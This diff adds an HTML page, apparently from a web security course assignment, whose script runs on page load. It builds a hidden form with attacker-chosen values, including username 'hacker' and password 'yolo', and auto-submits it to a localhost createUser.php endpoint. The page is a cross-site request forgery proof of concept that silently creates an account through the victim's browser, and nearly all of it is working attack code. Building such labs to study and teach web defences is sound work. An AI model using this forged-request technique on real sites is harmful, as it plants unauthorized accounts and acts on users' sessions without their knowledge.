@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <h1>
+            This page creates a form like the one in convert.php, fills and submits the form
+        </h1>
+        <script>
+            //As soon as the page loads, create the form, fill it and submit it
+            window.onload = function() {fill_and_send_form();}
+
+            function fill_and_send_form() {
+                //create a form element, set its attributes, and submit the form 
+
+                //create a <form> element.
+                var e = document.createElement("form")
+
+                //set the attributes of the form 
+                e.action = "http://localhost/Assignment_2/createUser.php"
+                e.target= "_self" // The response is displayed in the same frame
+                e.method = "post"
+
+                //create a string weith thml to set hidden fields
+                //corresponding to the edit user form 
+                //with values chosen by the attacker
+                
+                var form_fields = "<input type='hidden' name='fname' value='Hacker'>"
+                form_fields += "<input type='hidden' name='lname' value='Hacking this'>"
+                form_fields += "<input type='hidden' name='username' value='hacker'>"
+                form_fields += "<input type='hidden' name='password' value='yolo'>"
+                form_fields += "<input type='hidden' name='confirmedPasssword' value='yolo'>"
+                form_fields += "<input type='hidden' name='Submit' value='Submit'>"
+                
+                //Add the fields to the form 
+                e.innerHTML = form_fields
+                
+                //add the form to the current page.
+                document.body.appendChild(e)
+
+                //submit the form 
+                e.submit()
+            }
+        </script>
+    </body>
+</html>
